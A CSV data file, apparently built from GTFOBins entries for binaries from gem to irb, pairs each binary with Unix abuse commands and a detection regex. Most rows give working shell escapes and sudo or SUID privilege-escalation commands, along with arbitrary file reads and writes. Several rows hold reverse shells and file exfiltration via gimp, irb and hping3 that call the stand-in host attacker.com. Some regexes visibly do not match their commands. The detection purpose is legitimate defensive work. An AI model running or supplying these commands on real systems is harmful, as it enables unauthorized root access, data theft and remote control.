Name,Function,ExampleCode,Regex,Notes
gem,sudo,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+(?:/bin/(?:sh|bash))),This requires the name of an installed gem to be provided (`rdoc` is usually installed).
genie,shell,genie -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,suid,./genie -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genie,sudo,sudo genie -c '/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+(?:/bin/(?:sh|bash))),
genisoimage,file-read,"genisoimage -q -o - ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
genisoimage,suid,"./genisoimage -sort ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data."
genisoimage,sudo,"sudo genisoimage -q -o - ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ghc,shell,"ghc -e 'System.Process.callCommand ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+(?:/bin/(?:sh|bash))),
ghc,sudo,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+(?:/bin/(?:sh|bash))),
ghci,shell,"ghci
System.Process.callCommand ""/bin/sh""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghci\s+(?:/bin/(?:sh|bash))),
ghci,sudo,"sudo ghci
System.Process.callCommand ""/bin/sh""",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ghci\s+(?:/bin/(?:sh|bash))),
gimp,shell,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:\bimport\b))",
gimp,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
gimp,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
gimp,file-upload,"export LPORT=8888
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
gimp,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
gimp,file-write,"gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,file-read,"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gimp,library-load,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:\bimport\b)),
gimp,suid,"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
gimp,sudo,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-\-batch\-interpreter\s*\-b\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:\bimport\b))",
ginsh,shell,"ginsh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
ginsh,limited-suid,"./ginsh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
ginsh,sudo,"sudo ginsh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+(?:/bin/(?:sh|bash))),
git,shell,"PAGER='sh -c ""exec sh 0<&1""' git -p help","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,shell,"git help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,shell,"git branch --help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-\-help\s+(?:/bin/(?:sh|bash))),"The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,shell,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-\-allow\-empty\s*\-m\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option."
git,shell,"ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,file-read,git diff /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is displayed in `diff` style output format.
git,file-write,git apply --unsafe-paths --directory / x.patch,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-\-unsafe\-paths\s*\-\-directory\s+.+),"The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`."
git,sudo,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,sudo,"sudo git -p help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-p\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,sudo,"sudo git branch --help config
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-\-help\s+(?:/bin/(?:sh|bash))),"The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
git,sudo,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-\-allow\-empty\s*\-m\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option."
git,sudo,"ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
git,limited-suid,"PAGER='sh -c ""exec sh 0<&1""' ./git -p help","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grc,shell,grc --pty /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grc\s*\-\-pty\s+(?:/bin/(?:sh|bash))),
grc,sudo,sudo grc --pty /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grc\s*\-\-pty\s+(?:/bin/(?:sh|bash))),
grep,file-read,grep '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grep,suid,./grep '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
grep,sudo,sudo grep '' $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?grep\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,file-write,"gtester ""DATA"" -o $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Data to be written appears in an XML attribute in the output file (`<testbinary path=""DATA"">`)."
gtester,shell,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,sudo,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gtester,suid,"echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-p\s*\-q\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,file-read,gzip -f $LFILE -t,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,file-read,gzip -c $LFILE | gzip -d,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-c\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,suid,./gzip -f $LFILE -t,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gzip,sudo,sudo gzip -f $LFILE -t,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,file-read,"hd ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,suid,"./hd ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hd,sudo,"sudo hd ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,file-read,"head -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,suid,"./head -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
head,sudo,"sudo head -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?head\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hexdump,file-read,"hexdump -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hexdump,suid,"./hexdump -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hexdump,sudo,"sudo hexdump -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
highlight,file-read,"highlight --no-doc --failsafe ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?highlight\s*\-\-no\-doc\s*\-\-failsafe\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
highlight,suid,"./highlight --no-doc --failsafe ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?highlight\s*\-\-no\-doc\s*\-\-failsafe\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
highlight,sudo,"sudo highlight --no-doc --failsafe ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?highlight\s*\-\-no\-doc\s*\-\-failsafe\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
hping3,shell,"hping3
/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+(?:/bin/(?:sh|bash))),
hping3,suid,"./hping3
/bin/sh -p",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s*\-p\s+(?:/bin/(?:sh|bash))),
hping3,sudo,"sudo hping3
/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+(?:/bin/(?:sh|bash))),
hping3,sudo,"sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?hping3\s*\-\-icmp\s*\-\-data\s*\-\-sign\s*\-\-file\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:

```
sudo hping3 --icmp --listen xxx --dump
```
"
iconv,file-write,"echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iconv,file-read,"iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iconv,suid,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iconv,sudo,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
iftop,shell,"iftop
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+(?:/bin/(?:sh|bash))),
iftop,limited-suid,"./iftop
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+(?:/bin/(?:sh|bash))),
iftop,sudo,"sudo iftop
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+(?:/bin/(?:sh|bash))),
install,suid,./install -m 6777 $LFILE $TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?install\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
install,sudo,sudo install -m 6777 $LFILE $TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?install\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ionice,shell,ionice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ionice\s+(?:/bin/(?:sh|bash))),
ionice,suid,./ionice /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ionice\s*\-p\s+(?:/bin/(?:sh|bash))),
ionice,sudo,sudo ionice /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ionice\s+(?:/bin/(?:sh|bash))),
ip,file-read,"ip -force -batch ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ip,suid,"./ip -force -batch ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ip,suid,"./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s*\-p\s+(?:/bin/(?:sh|bash))),This only works for Linux with CONFIG_NET_NS=y.
ip,sudo,"sudo ip -force -batch ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s+(?:/bin/(?:sh|bash))),This only works for Linux with CONFIG_NET_NS=y.
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ip\s*\-s\s+(?:/bin/(?:sh|bash))),This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.
irb,shell,"irb
exec '/bin/bash'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:/bin/(?:sh|bash))),
irb,reverse-shell,"export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
irb,file-upload,"irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.+),Serve files in the local folder running an HTTP server on port 8888.
